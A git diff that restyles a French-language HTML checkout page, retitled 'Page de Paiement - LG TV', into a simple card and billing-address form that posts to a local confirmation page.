@@ -3,171 +3,183 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Page de Paiement</title>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+    <title>Page de Paiement - LG TV</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
     <style>
         body {
-            font-family: 'Roboto', sans-serif;
+            font-family: Arial, sans-serif;
+            background-color: #f9f9f9;
             margin: 0;
             padding: 0;
-            background-color: #f4f4f9;
         }
+
         .container {
             max-width: 900px;
-            margin: 40px auto;
-            background: #fff;
-            border-radius: 12px;
-            box-shadow: 0 6px 16px rgba(0, 0, 0, 0.1);
-            padding: 40px;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
         }
-        .progress-bar {
+
+        h2 {
+            text-align: center;
+            color: #c70000;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
+            font-weight: bold;
+            margin-bottom: 5px;
+            color: #555;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+
+        .form-group input:focus {
+            border-color: #c70000;
+        }
+
+        .form-group button {
+            width: 100%;
+            padding: 10px;
+            background-color: #c70000;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .form-group button:hover {
+            background-color: #a50000;
+        }
+
+        .credit-card-info {
             display: flex;
             justify-content: space-between;
-            margin-bottom: 30px;
-            font-family: 'Poppins', sans-serif;
+            gap: 15px;
         }
-        .progress-bar .step {
-            text-align: center;
+
+        .credit-card-info .card-info {
             flex: 1;
         }
-        .progress-bar .step span {
-            display: inline-block;
-            width: 40px;
-            height: 40px;
-            line-height: 40px;
-            border-radius: 50%;
-            background: #6c63ff;
-            color: #fff;
-            margin-bottom: 8px;
-            transition: background 0.3s ease;
-        }
-        .progress-bar .step.active span {
-            background: #28a745;
-        }
-        .payment-form {
-            margin-bottom: 20px;
-        }
-        .payment-form label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 600;
-            color: #333;
-        }
-        .payment-form input {
+
+        .credit-card-info .card-info select, .credit-card-info .card-info input {
             width: 100%;
-            padding: 12px;
-            margin-bottom: 20px;
+            padding: 10px;
             border: 1px solid #ddd;
-            border-radius: 8px;
-            font-size: 16px;
+            border-radius: 5px;
         }
-        .payment-form input:focus {
-            outline: none;
-            border-color: #6c63ff;
+
+        .payment-icons {
+            text-align: center;
+            margin-top: 20px;
         }
-        .order-summary {
-            margin-bottom: 20px;
-            border-top: 1px solid #f1f1f1;
-            padding-top: 20px;
-        }
-        .order-summary img {
-            width: 120px;
-            height: auto;
-            margin-right: 20px;
-            border-radius: 8px;
-        }
-        .order-summary .details {
-            display: flex;
-            align-items: center;
-        }
-        .order-summary .details .price {
-            font-size: 22px;
-            font-weight: 600;
+
+        .payment-icons i {
+            font-size: 2rem;
+            margin: 0 10px;
             color: #333;
         }
-        .footer {
-            text-align: center;
-            padding: 20px 0;
-            background: #6c63ff;
-            color: white;
-            border-radius: 0 0 12px 12px;
-        }
-        .footer a {
-            color: white;
-            text-decoration: none;
-            font-weight: 500;
-        }
-        .payment-button {
-            background-color: #28a745;
-            color: white;
-            padding: 15px 30px;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 18px;
-            width: 100%;
-            transition: background-color 0.3s ease;
-        }
-        .payment-button:hover {
-            background-color: #218838;
-        }
-        /* Responsiveness */
-        @media (max-width: 768px) {
-            .container {
-                padding: 20px;
-            }
-            .progress-bar .step span {
-                width: 35px;
-                height: 35px;
-            }
+
+        .payment-icons i:hover {
+            color: #c70000;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="progress-bar">
-            <div class="step active">
-                <span>1</span>
-                <p>Produit</p>
-            </div>
-            <div class="step active">
-                <span>2</span>
-                <p>Informations</p>
-            </div>
-            <div class="step active">
-                <span>3</span>
-                <p>Confirmation</p>
-            </div>
-        </div>
 
-        <div class="order-summary">
-            <h3>Résumé de la commande</h3>
-            <div class="details">
-                <img src="https://via.placeholder.com/120" alt="Produit">
-                <div>
-                    <p>Nom du produit</p>
-                    <p class="price">50,00 MAD</p>
+    <div class="container">
+        <h2>Informations de Paiement</h2>
+
+        <form action="confirmation.html" method="POST">
+            <!-- Informations de la carte de crédit -->
+            <div class="form-group">
+                <label for="card-number">Numéro de carte</label>
+                <input type="text" id="card-number" name="card-number" placeholder="Entrez le numéro de votre carte" required>
+            </div>
+
+            <div class="credit-card-info">
+                <div class="card-info">
+                    <label for="expiry-month">Mois d'expiration</label>
+                    <select id="expiry-month" name="expiry-month" required>
+                        <option value="" disabled selected>Mois</option>
+                        <option value="01">01</option>
+                        <option value="02">02</option>
+                        <option value="03">03</option>
+                        <option value="04">04</option>
+                        <option value="05">05</option>
+                        <option value="06">06</option>
+                        <option value="07">07</option>
+                        <option value="08">08</option>
+                        <option value="09">09</option>
+                        <option value="10">10</option>
+                        <option value="11">11</option>
+                        <option value="12">12</option>
+                    </select>
+                </div>
+
+                <div class="card-info">
+                    <label for="expiry-year">Année d'expiration</label>
+                    <select id="expiry-year" name="expiry-year" required>
+                        <option value="" disabled selected>Année</option>
+                        <option value="2025">2025</option>
+                        <option value="2026">2026</option>
+                        <option value="2027">2027</option>
+                        <option value="2028">2028</option>
+                        <option value="2029">2029</option>
+                    </select>
                 </div>
             </div>
-        </div>
 
-        <form class="payment-form">
-            <h3>Informations de paiement</h3>
-            <label for="card-number">Numéro de carte bancaire</label>
-            <input type="text" id="card-number" placeholder="1234 5678 9123 4567" required>
+            <div class="form-group">
+                <label for="cvv">CVV</label>
+                <input type="text" id="cvv" name="cvv" placeholder="Entrez le CVV" required>
+            </div>
 
-            <label for="expiry-date">Date d'expiration</label>
-            <input type="text" id="expiry-date" placeholder="MM/AA" required>
+            <!-- Informations de facturation -->
+            <div class="form-group">
+                <label for="billing-name">Nom sur la carte</label>
+                <input type="text" id="billing-name" name="billing-name" placeholder="Nom sur la carte" required>
+            </div>
 
-            <label for="cvv">Code CVV</label>
-            <input type="text" id="cvv" placeholder="123" required>
+            <div class="form-group">
+                <label for="billing-address">Adresse de facturation</label>
+                <input type="text" id="billing-address" name="billing-address" placeholder="Adresse de facturation" required>
+            </div>
 
-            <button type="submit" class="payment-button">Payer</button>
+            <div class="form-group">
+                <label for="billing-zip">Code postal de facturation</label>
+                <input type="text" id="billing-zip" name="billing-zip" placeholder="Code postal de facturation" required>
+            </div>
+
+            <div class="form-group">
+                <label for="billing-city">Ville de facturation</label>
+                <input type="text" id="billing-city" name="billing-city" placeholder="Ville de facturation" required>
+            </div>
+
+            <div class="form-group">
+                <button type="submit">Payer maintenant</button>
+            </div>
         </form>
 
-        <div class="footer">
-            <p>&copy; 2025 Votre Boutique. <a href="#">Conditions d'utilisation</a> | <a href="#">Confidentialité</a></p>
+        <div class="payment-icons">
+            <i class="fab fa-cc-visa"></i>
+            <i class="fab fa-cc-mastercard"></i>
+            <i class="fab fa-cc-amex"></i>
+            <i class="fab fa-cc-discover"></i>
         </div>
     </div>
+
 </body>
 </html>
